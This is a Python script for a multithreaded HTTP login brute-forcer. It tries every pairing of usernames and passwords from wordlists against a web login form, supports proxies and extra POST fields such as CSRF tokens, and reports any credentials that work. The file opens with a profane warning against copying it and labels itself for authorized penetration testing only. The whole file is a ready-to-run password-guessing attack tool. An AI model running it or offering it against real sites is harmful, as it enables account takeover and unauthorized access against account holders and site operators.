# Don't Fucking Copy The Script And Claim It Your's Fucking Skids Make Your Own or Atleast Try Changing or Upgrading The Code

#!/usr/bin/env python3
"""
bruteforce.py — HTTP Login Brute-Forcer
For authorized penetration testing only.
"""

import argparse
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

BANNER = r"""
____________ _   _ _____ ___________ ___________  _____  _____ 
| ___ \ ___ \ | | |_   _|  ___|  ___|  _  | ___ \/  __ \|  ___|
| |_/ / |_/ / | | | | | | |__ | |_  | | | | |_/ /| /  \/| |__  
| ___ \    /| | | | | | |  __||  _| | | | |    / | |    |  __| 
| |_/ / |\ \| |_| | | | | |___| |   \ \_/ / |\ \ | \__/\| |___ 
\____/\_| \_|\___/  \_/ \____/\_|    \___/\_| \_| \____/\____/ 
                   HTTP Login Brute-Forcer  v1.0
             [ For authorized penetration testing only ]
"""

# global
found_lock = Lock()
found: dict | None = None
attempt_count = 0
count_lock = Lock()


# session 
def make_session(proxy: str | None = None) -> requests.Session:
    s = requests.Session()
    retry = Retry(total=3, backoff_factor=0.3, status_forcelist=[500, 502, 503])
    s.mount("http://", HTTPAdapter(max_retries=retry))
    s.mount("https://", HTTPAdapter(max_retries=retry))
    if proxy:
        s.proxies = {"http": proxy, "https": proxy}
    return s


# attempt 
def try_credential(
    url: str,
    user_field: str,
    pass_field: str,
    username: str,
    password: str,
    fail_string: str,
    extra_data: dict,
    timeout: int,
    delay: float,
    proxy: str | None,
    verbose: bool,
) -> dict | None:
    global found

    with found_lock:
        if found:
            return None

    if delay:
        time.sleep(delay)

    payload = {user_field: username, pass_field: password, **extra_data}

    try:
        session = make_session(proxy)
        r = session.post(url, data=payload, timeout=timeout, allow_redirects=True)
        success = fail_string not in r.text

        with count_lock:
            global attempt_count
            attempt_count += 1

        if verbose:
            status = "HIT " if success else "miss"
            print(f"  [{status}] {username}:{password}  ({r.status_code})")

        if success:
            with found_lock:
                if not found:
                    found = {"username": username, "password": password, "status": r.status_code}
                    return found
    except requests.RequestException as e:
        if verbose:
            print(f"  [err ] {username}:{password}  → {e}", file=sys.stderr)

    return None


#  core 
def run(args: argparse.Namespace) -> None:
    print(BANNER)

    # credential 
    usernames = (
        [args.username] if args.username
        else open(args.userlist).read().splitlines()
    )
    passwords = open(args.wordlist).read().splitlines()

    pairs = [(u, p) for u in usernames for p in passwords]

    # Extra post fields 
    extra = {}
    if args.extra:
        for kv in args.extra:
            k, _, v = kv.partition("=")
            extra[k] = v

    print(f"[*] Target   : {args.url}")
    print(f"[*] Pairs    : {len(pairs):,}  ({len(usernames)} user(s) × {len(passwords)} password(s))")
    print(f"[*] Threads  : {args.threads}")
    print(f"[*] Delay    : {args.delay}s")
    print()

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {
            pool.submit(
                try_credential,
                args.url, args.user_field, args.pass_field,
                u, p,
                args.fail_string, extra,
                args.timeout, args.delay, args.proxy, args.verbose,
            ): (u, p)
            for u, p in pairs
        }

        try:
            for f in as_completed(futures):
                result = f.result()
                if result:
                    for pending in futures:
                        pending.cancel()
                    break
        except KeyboardInterrupt:
            print("\n[!] Aborted by user.")
            sys.exit(1)

    print(f"\n[*] Attempts : {attempt_count:,}")

    if found:
        print(f"\n[+] CREDENTIALS FOUND")
        print(f"    Username : {found['username']}")
        print(f"    Password : {found['password']}")
        print(f"    Status   : {found['status']}")
    else:
        print("\n[-] No valid credentials found.")


# cli 
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="HTTP Login Brute-Forcer — authorized use only",
        formatter_class=argparse.RawTextHelpFormatter,
    )

    p.add_argument("url", help="Login endpoint (e.g. http://target.local/login)")

    creds = p.add_argument_group("credentials")
    creds.add_argument("-u", "--username", help="Single username")
    creds.add_argument("-U", "--userlist", help="File with usernames (one per line)")
    creds.add_argument("-w", "--wordlist", required=True, help="Password wordlist file")

    fields = p.add_argument_group("form fields")
    fields.add_argument("--user-field", default="username", help="HTML name of username field [%(default)s]")
    fields.add_argument("--pass-field", default="password", help="HTML name of password field [%(default)s]")
    fields.add_argument(
        "--fail-string", default="Invalid", metavar="STR",
        help="String present in response on failed login [%(default)r]",
    )
    fields.add_argument(
        "-x", "--extra", action="append", metavar="KEY=VALUE",
        help="Extra POST fields (repeat for multiple, e.g. -x csrf_token=abc123)",
    )

    perf = p.add_argument_group("performance")
    perf.add_argument("-t", "--threads", type=int, default=10, help="Concurrent threads [%(default)s]")
    perf.add_argument("-d", "--delay", type=float, default=0.0, help="Delay between requests in seconds [%(default)s]")
    perf.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds [%(default)s]")

    misc = p.add_argument_group("misc")
    misc.add_argument("--proxy", help="HTTP(S) proxy (e.g. http://127.0.0.1:8080)")
    misc.add_argument("-v", "--verbose", action="store_true", help="Print every attempt")

    args = p.parse_args()

    if not args.username and not args.userlist:
        p.error("Provide either -u (single username) or -U (userlist file).")

    return args


if __name__ == "__main__":
    run(parse_args())
